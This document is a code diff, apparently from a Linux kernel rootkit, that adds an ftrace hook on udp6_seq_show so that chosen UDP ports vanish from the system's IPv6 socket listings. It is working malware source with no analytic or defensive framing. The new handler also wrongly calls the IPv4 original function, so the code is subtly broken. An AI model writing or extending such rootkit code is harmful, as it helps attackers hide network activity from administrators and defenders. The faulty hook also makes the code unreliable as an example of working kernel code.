@@ -8,9 +8,10 @@ int *hidden_udp_ports;
 int *hidden_udp_ips;
 
 static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
-//static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
 
 struct ftrace_hook hook_udp4_seq_show = HOOK("udp4_seq_show", malw_udp4_seq_show, &orig_udp4_seq_show);
+struct ftrace_hook hook_udp6_seq_show = HOOK("udp6_seq_show", malw_udp6_seq_show, &orig_udp6_seq_show);
 
 
 void add_hidden_udp_ip(char *str)
@@ -83,11 +84,13 @@ void remove_hidden_udp_port(int port)
 void install_udp_seq_show_hook(void)
 {
     fh_install_hook(&hook_udp4_seq_show);
+    fh_install_hook(&hook_udp6_seq_show);
 }
 
 void remove_udp_seq_show_hook(void)
 {
     fh_remove_hook(&hook_udp4_seq_show);
+    fh_remove_hook(&hook_udp6_seq_show);
     kfree(hidden_udp_ports);
 }
 
@@ -116,3 +119,19 @@ asmlinkage long malw_udp4_seq_show(struct seq_file *seq, void *v)
     return ret;
 }
 
+asmlinkage long malw_udp6_seq_show(struct seq_file *seq, void *v)
+{
+    int i;
+    long ret;
+    struct sock *sk = v;
+
+
+    for (i = 0; i < udp_port_size; i++) {
+        if (sk != (struct sock *)0x1 && (sk->sk_num == *(hidden_udp_ports + i) || be16_to_cpu(sk->sk_dport) == *(hidden_udp_ports + i))) {
+            return 0;
+        }
+    }
+
+    ret = orig_udp4_seq_show(seq, v);
+    return ret;
+}
